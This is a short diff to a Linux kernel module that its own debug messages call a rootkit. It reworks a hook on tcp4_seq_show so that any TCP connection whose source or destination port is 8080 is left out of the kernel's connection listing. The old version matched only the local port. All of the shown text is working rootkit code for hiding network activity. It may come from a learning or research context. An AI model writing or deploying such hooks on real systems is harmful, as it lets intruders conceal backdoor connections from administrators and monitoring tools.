@@ -20,16 +20,19 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 /* This is our hook function for tcp4_seq_show */
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-	long ret;
-	struct sock *sk = v;
+    struct inet_sock *is;
+    long ret;
+    unsigned short port = htons(8080);
 
-	/* 0x1f90 = 8080 in hex */
-	if (sk != (struct sock *)0x1 && sk->sk_num == 0x1f90)
-	{
-		printk(KERN_DEBUG "rootkit: Found process listening on port 8080 - hiding!\n");
-		return 0;
+    if (v != SEQ_START_TOKEN) {
+		is = (struct inet_sock *)v;
+		if (port == is->inet_sport || port == is->inet_dport) {
+			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				   ntohs(is->inet_sport), ntohs(is->inet_dport));
+			return 0;
+		}
 	}
-	
+
 	ret = orig_tcp4_seq_show(seq, v);
 	return ret;
 }
